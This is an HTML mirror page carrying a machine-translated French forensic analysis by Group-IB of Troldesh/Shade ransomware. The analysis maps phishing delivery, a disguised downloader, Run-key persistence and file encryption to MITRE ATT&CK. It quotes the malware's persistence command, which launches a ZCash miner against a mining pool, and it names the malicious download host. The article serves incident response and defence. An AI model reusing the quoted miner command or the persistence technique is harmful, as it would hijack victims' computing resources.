<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👨🏻‍🍳 🍑 👎🏿 C'est tout ce qui vous reste: les artefacts médico-légaux du ransomware Troldesh (Shade) 🎒 ⭐️ 👩🏼‍🤝‍👨🏽</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Si vous suivez l' actualité , vous connaissez probablement une nouvelle attaque à grande échelle contre les sociétés russes du virus roldomware Trolde...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>C'est tout ce qui vous reste: les artefacts médico-légaux du ransomware Troldesh (Shade)</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/group-ib/blog/457592/"><img src="https://habrastorage.org/webt/tx/fa/y5/txfay55dbgafekaewi9vtxtv5nw.png" alt="image"><br><br>  Si vous suivez l' <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">actualité</a> , vous connaissez probablement une nouvelle attaque à grande échelle contre les sociétés russes du virus roldomware Troldesh (Shade), l'un des cryptolockers les plus populaires parmi les cybercriminels.  Rien qu'en juin, Group-IB a découvert plus de 1 100 e-mails de phishing de Troldesh envoyés au nom d'employés de grandes compagnies aériennes, de concessionnaires automobiles et des médias. <br><br>  Dans cet article, nous examinerons les artefacts médico-légaux qui peuvent être trouvés après une attaque Shade / Troldesh sur les médias d'un appareil compromis, et comparerons également les tactiques et techniques utilisées par les attaquants avec MITRE ATT &amp; CK. <br><br>  Publié par <b>Oleg Skulkin</b> , médecin légiste de premier plan au Groupe IB <br><a name="habracut"></a><br>  Troldesh, également connu sous le nom de Shade, XTBL, Trojan.Encoder.858, Da Vinci, No_more_ransome, est un virus qui crypte les fichiers sur le périphérique infecté d'un utilisateur et nécessite une rançon pour restaurer l'accès aux informations.  Des campagnes récentes avec Troldesh ont montré que maintenant, non seulement il crypte les fichiers, mais aussi les mineurs de crypto-monnaie et génère du trafic vers des sites Web pour augmenter le trafic et les revenus de la publicité en ligne. <br><br>  La première fois que l'activité de Troldesh a été détectée par des experts du Groupe IB en 2015, ils ont remarqué que le virus avait réussi à contourner les outils de protection antivirus.  Les attaquants ont régulièrement changé le «packer» - un programme de packer qui réduit la taille des fichiers et le rend difficile à détecter et à inverser - pour cette raison, les programmes antivirus l'ont souvent ignoré.  À la fin de 2018, Troldesh est devenu l'un des virus les plus populaires et est entré en toute confiance dans le top 3, avec RTM et Pony.  Les experts de PaloAlto Networks ont indiqué que Troldesh ne fonctionne pas uniquement à des fins russes - parmi les pays touchés par les ransomwares, on trouve les États-Unis, le Japon, l'Inde, la Thaïlande et le Canada. <br><br><h3>  Vecteur d'infection initial </h3><br>  En règle générale, «Troldesh / Shade» est distribué via des e-mails de phishing avec des pièces jointes malveillantes, par exemple, des archives protégées par mot de passe contenant des fichiers JS malveillants, après ouverture, le cryptolocker est téléchargé et lancé.  Qu'est-ce que cela signifie?  Ce serait une bonne idée de commencer notre étude en analysant les traces de l'ouverture de telles archives.  Où trouver de telles traces?  Eh bien, par exemple, dans les listes de raccourcis: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/hh/k-/yp/hhk-ypo6ixpvwwayr35d2b_u1qg.png" alt="image alt"></div><br>  <i>Données extraites du fichier 5f7b5f1e01b83767.automaticDestinations-ms à l'aide de JLECmd</i> <i><br></i> <br>  Ainsi, nous voyons que l'utilisateur a ouvert l'archive avec le nom "mot de passe 11.rar sur la commande".  Mais comment est-il entré dans le système?  Le fichier se trouve dans le répertoire Téléchargements, très probablement il a été téléchargé depuis Internet.  Jetons un coup d'œil à l'historique du navigateur: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/ws/bd/p_/wsbdp_7cry0lrxupqxpultymp3w.png" alt="image alt"></div><br>  <i>Données extraites du fichier WebCache01.dat à l'aide de Belkasoft Evidence Center</i> <i><br></i> <br>  Comme vous pouvez le voir, le fichier a été téléchargé à l'aide du navigateur Web Microsoft Edge et enregistré dans le répertoire Téléchargements.  De plus, juste avant le téléchargement, l'utilisateur a visité le site Web, donc l'archive a été reçue par e-mail. <br>  Ainsi, nous avons affaire à la technique la plus courante: T1193 - «Attachement de chasse au harpon». <br><br><h3>  Démarrage et contournement des mécanismes de protection </h3><br>  Si nous regardons à l'intérieur de l'archive, nous trouverons un fichier JS avec un nom presque identique.  Pour que le malware se charge et commence à fonctionner, l'utilisateur doit double-cliquer sur le fichier spécifié.  Après cela, «wscript.exe» lancera le fichier JS, qui téléchargera le fichier malveillant depuis <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">mat.tradetoolsfx</a> [.] Com et l'exécutera.  Pouvons-nous en trouver des traces sur le disque?  Bien sûr! <br><br>  Examinons le fichier de prélecture wscript.exe, en nous concentrant sur les fichiers avec lesquels il a interagi: <br>  &lt;...&gt; <br>  \ VOLUME {01d3dcb4976cd072-3a97874f} \ USERS \ 0136 \ APPDATA \ LOCAL \ MICROSOFT \ WINDOWS \ INETCACHE \ IE \ OEJ87644 \ 1C [1] .JPG <br>  \ VOLUME {01d3dcb4976cd072-3a97874f} \ USERS \ 0136 \ APPDATA \ LOCAL \ TEMP \ 7ZO84024637 \ DÉTAILS DE LA COMMANDE A.JS <br>  &lt;...&gt; <br>  Nous avons donc deux fichiers intéressants.  Premièrement, nous connaissons maintenant le nom du fichier JS qui se trouvait dans l'archive, et deuxièmement, nous avons découvert le nom du fichier qu'il a téléchargé.  Il est temps de savoir d'où il a été téléchargé.  Jetons à nouveau un œil à WebCache01.dat: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/1u/4v/9_/1u4v9_9f9ulw6w11yfm7ftvu-ns.png" alt="image alt"></div><br>  <i>Données extraites de WebCache01.dat à l'aide de ESEDatabaseView</i> <i><br></i> <br>  Si nous décodons le contenu du champ ResponseHeaders, nous obtenons ce qui suit: <br>  HTTP / 1.1 200 OK <br>  Type de contenu: image / jpeg <br>  Longueur du contenu: 1300656 <br>  ETag: "5ced19b6-13d8b0" <br>  Strict-Transport-Security: max-age = 31536000; <br>  En fait, ce n'est pas un fichier JPG, mais un fichier exécutable qui déchiffre et lance une instance de Shade. <br>  Alors, quelles techniques traitons-nous ici?  Script (T1064), exécution utilisateur (T1204) et masquage (T1036). <br><br><h3>  Broche système </h3><br>  «Shade» utilise une manière plutôt banale de réparer le système - la clé de registre «Software \ Microsoft \ Windows \ CurrentVersion \ Run» (T1060).  Nous savons déjà que le fichier JS malveillant a été ouvert par l'utilisateur "0136", alors jetez un œil au fichier correspondant "NTUSER.DAT": <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/w-/q9/fd/w-q9fdff43kczyndmw7ak9xdgxg.png" alt="image alt"></div><br>  <i>Le mécanisme de verrouillage du système détecté par Belkasoft Evidence Center</i> <i><br></i> <br>  Mais ce n’est pas tout!  Plus intéressant encore: <br><div style="text-align:center;"><img src="https://habrastorage.org/webt/gm/hl/mz/gmhlmzuplqi7rketrgukc_thomi.png" alt="image alt"></div><br>  <i>Le mécanisme de verrouillage du système détecté par Belkasoft Evidence Center</i> <i><br></i> <br>  Comme vous pouvez le voir dans l'illustration, il existe une autre entrée intéressante pointant vers C: \ ProgramData \ SysWOW64 \ leWRX7w.cmd.  Voyons ce qu'il y a dans ce fichier: <br>  echo CreateObject ("Wscript.Shell"). Exécutez "" ^ &amp; WScript.Arguments (0) ^ &amp; "", 0, False&gt; "% TEMP% / pxNXSB.vbs" &amp;&amp; start / WAIT wscript.exe "% TEMP% /pxNXSB.vbs "" C: \ Users \ 0136 \ AppData \ Roaming \ SOFTWA ~ 1 \ NHEQMI ~ 1.EXE -l eu1-zcash.flypool.org ∗ 333 -u t1L9iBXyRgaYrQ5JSTSdstopV6pHtZ2Xdep.7B9D281 &amp;% TEMP% \ pxNXSB.vbs " <br>  Nous avons donc un fichier de plus.  À en juger par son contenu, il est utilisé par des attaquants pour exploiter la crypto-monnaie ZCash.  Ainsi, même si la victime paie la rançon, les ressources de son système seront toujours utilisées par les intrus. <br><br><h3>  Les conséquences </h3><br>  Tout d'abord, "Shade" est un cryptoclocker, donc la première chose qui attire votre attention est beaucoup de fichiers avec l'extension "CRYPTED000007", des fichiers "Lisez-moi", ainsi que des fonds d'écran "frais" sur votre bureau: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/xc/wd/pv/xcwdpvfzo6gdobpsq6yyuiwozmg.png" alt="image alt"></div><br>  Un fichier avec cette image se trouve dans le répertoire C: \ Users \% username% \ AppData \ Roaming.  De quel équipement traitons-nous?  «Données chiffrées pour l'impact» (T1486). <br>  Mais, comme vous l'avez déjà compris, "Shade" n'est pas un casier cryptographique ordinaire.  En plus du cryptoclocker lui-même, nous avons également trouvé un mineur, ce qui signifie qu'il vaut la peine de mentionner une autre technique - «Resource Hijacking». <br><br><h3>  MITRE ATT &amp; CK </h3><br>  Notre analyse a révélé un certain nombre de tactiques et de techniques des distributeurs Shade, résumons: <br><br><div class="scrollable-table"><table><tbody><tr><th>  Identifiant </th><th>  Nom </th><th>  La description </th></tr><tr><td>  <b>T1193</b> </td><td>  Attachement de chasse au harpon </td><td>  Shade est distribué via des e-mails de phishing avec des pièces jointes malveillantes </td></tr><tr><td>  <b>T1204</b> </td><td>  Exécution utilisateur </td><td>  Le fichier JS de l'archive jointe à l'e-mail doit être lancé par l'utilisateur. </td></tr><tr><td>  <b>T1064</b> </td><td>  Scripting </td><td>  Les attaquants utilisent des fichiers JS pour télécharger des logiciels malveillants </td></tr><tr><td>  <b>T1036</b> </td><td>  Masquerading </td><td>  Les fichiers malveillants téléchargés ont l'extension «JPG» au lieu de «EXE» </td></tr><tr><td>  <b>T1060</b> </td><td>  Clés d'exécution du registre / dossier de démarrage </td><td>  "Shade" utilise la clé de registre "Software \ Microsoft \ Windows \ CurrentVersion \ Run" pour ancrer dans le système </td></tr><tr><td>  <b>T1486</b> </td><td>  Données chiffrées pour l'impact </td><td>  Shade chiffre les fichiers pour obtenir une rançon </td></tr><tr><td>  <b>T1496</b> </td><td>  Détournement de ressources </td><td>  Shade utilise les ressources informatiques des victimes pour extraire la crypto-monnaie </td></tr></tbody></table></div></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr457592/">https://habr.com/ru/post/fr457592/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr457576/index.html">KnowledgeConf - décollé ou non?</a></li>
<li><a href="../fr457578/index.html">Systèmes neuromorphiques: des ordinateurs inspirés du cerveau humain</a></li>
<li><a href="../fr457580/index.html">JavaScript: création d'une application MEVN simple</a></li>
<li><a href="../fr457582/index.html">Sueur, larmes et suivi du temps - comment nous avons augmenté la rentabilité de l'entreprise</a></li>
<li><a href="../fr457588/index.html">Barcamp - le premier événement public dans le village</a></li>
<li><a href="../fr457596/index.html">OSDay 19 ou pourquoi le langage C est toujours vivant</a></li>
<li><a href="../fr457600/index.html">Présentation des casques Snom A150, Snom A100M et D</a></li>
<li><a href="../fr457602/index.html">Recherche des performances du SGBD MS SQL Server Developer 2016 et PostgreSQL 10.5 pour 1C</a></li>
<li><a href="../fr457606/index.html">Alan Kay: Ce que l'on peut appeler la chose la plus étonnante que les ordinateurs ont rendue possible</a></li>
<li><a href="../fr457608/index.html">Comment visualiser les données dans une histoire captivante</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>